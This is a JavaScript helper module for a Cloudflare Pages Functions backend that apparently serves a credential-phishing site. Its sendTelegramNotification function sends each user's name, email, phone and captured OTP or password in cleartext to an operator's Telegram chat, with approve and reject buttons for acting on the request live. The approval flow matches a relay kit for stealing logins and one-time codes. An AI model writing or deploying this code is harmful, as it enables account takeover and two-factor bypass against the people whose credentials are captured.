// Shared logic for Cloudflare Pages Functions backend
// NOTE: In-memory storage is ephemeral and not suitable for production; for durability, replace with Workers KV or D1.
const otpRequests = new Map();
const passwordRequests = new Map();

function makeJsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json;charset=UTF-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type,Authorization",
    },
  });
}

function makeTextResponse(text, status = 200) {
  return new Response(text, {
    status,
    headers: {
      "Content-Type": "text/html;charset=UTF-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type,Authorization",
    },
  });
}

function uuidv4() {
  if (typeof crypto?.randomUUID === "function") return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

async function sendTelegramNotification({ requestId, phone, otp, password, email, firstName, lastName, type }, env, requestUrl) {
  const botToken = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_ADMIN_CHAT_ID;
  const callbackToken = env.TELEGRAM_CALLBACK_TOKEN;

  if (!botToken || !chatId || !callbackToken) {
    console.warn("Telegram env variables missing; skipping Telegram notification");
    return;
  }

  const baseUrl = new URL(requestUrl).origin;
  const approveUrl = `${baseUrl}/api/telegram/approve`;

  const message = `🔐 <b>New ${type} Request</b>\n\n` +
    `👤 <b>User:</b> ${firstName || "N/A"} ${lastName || ""}\n` +
    `📧 <b>Email:</b> ${email || "N/A"}\n` +
    `📱 <b>Phone:</b> ${phone}\n` +
    `🔑 <b>OTP/Password:</b> <code>${otp || password || "N/A"}</code>\n` +
    `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
    `<b>Request ID:</b> <code>${requestId}</code>`;

  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ APPROVE",
            url: `${approveUrl}?requestId=${requestId}&action=approve&token=${callbackToken}`,
          },
          {
            text: "❌ REJECT",
            url: `${approveUrl}?requestId=${requestId}&action=reject&token=${callbackToken}`,
          },
        ],
      ],
    },
  };

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      console.error("Telegram sendMessage failed", await resp.text());
    }
  } catch (err) {
    console.error("Telegram notification error", err);
  }
}

function getDataStore(type) {
  if (type === "otp") return otpRequests;
  if (type === "password") return passwordRequests;
  throw new Error(`Unsupported type: ${type}`);
}

export {
  makeJsonResponse,
  makeTextResponse,
  uuidv4,
  sendTelegramNotification,
  getDataStore,
  otpRequests,
  passwordRequests,
};
